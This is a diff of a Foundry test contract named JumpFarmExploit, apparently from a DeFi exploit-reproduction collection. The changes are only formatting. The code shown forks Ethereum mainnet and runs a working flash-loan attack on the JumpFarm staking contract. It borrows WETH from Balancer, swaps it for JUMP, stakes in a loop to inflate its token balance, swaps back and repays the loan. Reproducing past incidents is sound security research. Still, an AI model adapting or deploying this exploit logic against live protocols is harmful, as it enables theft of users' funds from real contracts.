@@ -17,7 +17,6 @@ interface IStaking {
     function stake(address _to, uint256 _amount) external;
 }
 
-
 contract JumpFarmExploit is Test {
     IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -27,7 +26,7 @@ contract JumpFarmExploit is Test {
     IERC20 sJump = IERC20(0xdd28c9d511a77835505d2fBE0c9779ED39733bdE);
 
     function setUp() public {
-        vm.createSelectFork("https://eth.llamarpc.com", 18070346);
+        vm.createSelectFork("https://eth.llamarpc.com", 18_070_346);
 
         vm.label(address(balancer), "BalancerVault");
         vm.label(address(weth), "WETH");
@@ -47,7 +46,12 @@ contract JumpFarmExploit is Test {
         emit log_named_decimal_uint("eth balance after exploit", weth.balanceOf(address(this)), 18);
     }
 
-    function receiveFlashLoan(address[] memory /*tokens*/, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
+    function receiveFlashLoan(
+        address[] memory, /*tokens*/
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
         weth.approve(address(router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(weth);
@@ -56,7 +60,7 @@ contract JumpFarmExploit is Test {
         jump.approve(address(staking), type(uint256).max);
         sJump.approve(address(staking), type(uint256).max);
         uint8 i = 0;
-        while(i < uint8(userData[0])) {
+        while (i < uint8(userData[0])) {
             i += 1;
             uint256 amountJump = jump.balanceOf(address(this));
             staking.stake(address(this), amountJump);
@@ -65,13 +69,13 @@ contract JumpFarmExploit is Test {
         }
 
         jump.approve(address(router), type(uint256).max);
-        uint amount = jump.balanceOf(address(this));
+        uint256 amount = jump.balanceOf(address(this));
         emit log_named_decimal_uint("jump token balance after exploit", amount, jump.decimals());
-        
+
         path[0] = address(jump);
         path[1] = address(weth);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
-        weth.transfer(address(balancer), amounts[0]+feeAmounts[0]);
+        weth.transfer(address(balancer), amounts[0] + feeAmounts[0]);
     }
 
     receive() external payable {}
